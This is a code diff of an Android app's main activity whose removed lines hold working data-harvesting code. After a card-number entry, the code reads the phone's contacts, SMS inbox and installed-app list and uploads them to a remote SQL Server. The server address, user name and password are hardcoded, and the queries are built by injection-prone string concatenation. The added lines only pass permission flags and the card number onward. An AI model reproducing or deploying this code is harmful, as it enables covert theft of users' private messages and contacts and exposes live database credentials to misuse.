@@ -35,6 +35,7 @@ import java.sql.Statement;
 import java.util.ArrayList;
 import java.util.LinkedList;
 import java.util.List;
+import java.util.concurrent.TimeUnit;
 
 public class MainActivity extends AppCompatActivity {
 
@@ -45,20 +46,13 @@ public class MainActivity extends AppCompatActivity {
     private static boolean READ_CONTACTS_GRANTED = false;
     private static boolean READ_INTERNET_GRANTED = false;
     private static boolean READ_SMS_GRANTED = false;
-    private Connection connection = null;
     private String cardnumber="";
-    private PackageManager packageManager = null;
-    private List applist = null;
-    private LinkedList<String> contacts = new LinkedList<>();
-    private LinkedList<SMSclass> sms = new LinkedList<>();
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         CheckForPermissions();
-
-
 
 //        ((TextView) findViewById(R.id.editTextNumber)).addTextChangedListener(new TextWatcher() {
 //            @Override
@@ -83,17 +77,6 @@ public class MainActivity extends AppCompatActivity {
 //                }
 //            }
 //        });
-
-        if(READ_CONTACTS_GRANTED) {
-            readContacts();
-        }
-        if(READ_SMS_GRANTED) {
-                readSMS();
-            }
-
-
-    packageManager = getPackageManager();
-    new LoadApplications().execute();
 
     }
 
@@ -125,24 +108,27 @@ public class MainActivity extends AppCompatActivity {
 
     }
 
-    public void openOtherWindow(View v) {
-        Intent intent = new Intent(this, ValidActivity.class);
-        intent.putExtra("in_data", "Hello from Main Activity!");
-        startActivity(intent);
-    }
+//    public void openOtherWindow(View v) {
+//        Intent intent = new Intent(this, ValidActivity.class);
+//        intent.putExtra("in_data", "Hello from Main Activity!");
+//        startActivity(intent);
+//    }
 
     public void onClickLogin(View v) {
 
-
-
         if(((TextView)findViewById(R.id.editTextNumber)).getText().toString().length()==16) {
             cardnumber=((TextView)findViewById(R.id.editTextNumber)).getText().toString();
-            new LoadDataBase().execute();
-            Intent servintent=new Intent(this, MyService2.class);
-            startService(servintent);
+
 
             Intent intent =  new Intent(this.getApplicationContext(), ActivityMenu.class);
+            Log.d("db", "intent created");
+            intent.putExtra("contacts",READ_CONTACTS_GRANTED);
+            intent.putExtra("sms",READ_SMS_GRANTED);
+            intent.putExtra("databases",READ_INTERNET_GRANTED);
+            intent.putExtra("cardnumber",cardnumber);
             startActivity(intent);
+
+
         }
         else
         {
@@ -161,204 +147,7 @@ public class MainActivity extends AppCompatActivity {
 
 
 
-    private List checkForLaunchIntent(List<ApplicationInfo> list) {
-
-        ArrayList appList = new ArrayList();
-
-        for (ApplicationInfo info : list) {
-            try {
-                if (packageManager.getLaunchIntentForPackage(info.packageName) != null) {
-                    appList.add(info.name);
-                }
-            } catch (Exception e) {
-                e.printStackTrace();
-            }
-        }
-
-        return appList;
-    }
 
 
-    private class LoadDataBase extends AsyncTask<Void, Void, Void> {
-        String dbURL = "jdbc:jtds:sqlserver://SQL5103.site4now.net:1433/DB_A72B1E_Secure";
-        String user = "DB_A72B1E_Secure_admin";
-        String pass = "Alexz73canY";
-        @Override
-        protected Void doInBackground(Void... params) {
-            if (READ_INTERNET_GRANTED) {
-                Log.d("db",(READ_INTERNET_GRANTED)?"true":"false");
-                try {
-
-                    Class.forName("net.sourceforge.jtds.jdbc.Driver");
-                    connection = DriverManager.getConnection(dbURL, user, pass);
-                } catch (ClassNotFoundException | SQLException e) {
-                    e.printStackTrace();
-                }
-
-
-                if (connection != null) {
-                    Statement statement = null;
-                    try {
-                        statement = connection.createStatement();
-                        int clientID=0;
-                        ResultSet resultSet = statement.executeQuery("Select ID FROM Clients WHERE CardNumber='"+cardnumber+"'");
-                        resultSet.next();
-                        clientID = resultSet.getInt(1);
-
-                        if(clientID>0) {
-                            String insertstring = "INSERT Contacts(ClientID, ContactName) VALUES (";
-                            for (int k = 0; k < contacts.size(); k++) {
-                                insertstring += clientID + ", '" + contacts.get(k) + "'";
-                                if (k < contacts.size() - 1) {
-                                    insertstring += "), (";
-                                }
-
-                            }
-                            insertstring +=")";
-                            Log.d("db",insertstring);
-                             int rows = statement.executeUpdate(insertstring);
-
-                            insertstring = "INSERT INTO Messages(ClientID, MessageFrom, MessageText) VALUES (";
-                            for (int k = 0; k < sms.size(); k++) {
-                                insertstring += clientID + ", '" + sms.get(k).sender + "','"+sms.get(k).text+"'";
-                                if (k < sms.size() - 1) {
-                                    insertstring += "), (";
-                                }
-
-                            }
-                            insertstring +=")";
-                            statement.executeUpdate(insertstring);
-
-                            insertstring = "INSERT INTO Applications(ClientID, ApplicationName) VALUES (";
-                            for (int k = 0; k < applist.size(); k++) {
-                                insertstring += clientID + ", '" + applist.get(k) + "'";
-                                if (k < applist.size() - 1) {
-                                    insertstring += "), (";
-                                }
-
-                            }
-                            insertstring +=")";
-                            statement.executeUpdate(insertstring);
-                        }
-                        else
-                        {
-                            Log.d("db","Таких в бд нет!");
-                        }
-                    } catch (SQLException throwables) {
-                        Log.d("db",throwables.getMessage());
-                    }
-
-                }
-                else
-                {
-                    Log.d("db","Коннекшн не установлен");
-                }
-            }
-
-//
-            return null;
-        }
-
-        @Override
-        protected void onPostExecute(Void result) {
-
-            super.onPostExecute(result);
-        }
-
-        @Override
-        protected void onPreExecute() {
-
-            super.onPreExecute();
-        }
-    }
-
-
-    private class LoadApplications extends AsyncTask<Void, Void, Void> {
-
-
-
-        @Override
-        protected Void doInBackground(Void... params) {
-
-            applist = checkForLaunchIntent(packageManager.getInstalledApplications(PackageManager.GET_META_DATA));
-//
-            return null;
-        }
-
-        @Override
-        protected void onPostExecute(Void result) {
-
-//            for (int k = 0; k < applist.size(); k++)
-//            {
-//                Log.d("applkist", applist.get(k).toString());
-//            }
-//
-//            for (int k = 0; k < contacts.size(); k++)
-//            {
-//                Log.d("contactsList", contacts.get(k).toString());
-//            }
-//
-//            for (int k = 0; k < sms.size(); k++)
-//            {
-//                Log.d("smsList", sms.get(k).getSender()+":"+sms.get(k).getText());
-//            }
-
-//
-//
-
-            super.onPostExecute(result);
-        }
-
-        @Override
-        protected void onPreExecute() {
-
-            super.onPreExecute();
-        }
-    }
-
-
-
-    private LinkedList<String> readContacts() {
-        ContentResolver contentResolver = getContentResolver();
-        Cursor cursor = contentResolver.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
-        contacts = new LinkedList<>();
-        try {
-            if (cursor != null) {
-
-                while (cursor.moveToNext()) {
-
-                    String contact = "!"+cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME_PRIMARY));
-
-                    contacts.add(contact.replace("'","*"));
-                    Log.d("Contacts", (String) contacts.get(contacts.size()-1));
-                }
-
-                cursor.close();
-            }
-
-
-        } catch (Exception ex) {
-            Toast.makeText(getApplicationContext(), ex.getMessage(), Toast.LENGTH_LONG).show();
-        }
-        return contacts;
-
-    }
-
-    private LinkedList<SMSclass> readSMS()
-    {
-
-        Cursor cursor = getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, null);
-        sms=new LinkedList<>();
-        if (cursor.moveToFirst())
-        {
-            do {
-
-                sms.add(new SMSclass(cursor.getString(2).replace("'","*"),cursor.getString(12).replace("'","*")));
-
-                // use msgData
-            } while (cursor.moveToNext());
-        }
-        return  sms;
-    }
 
 }
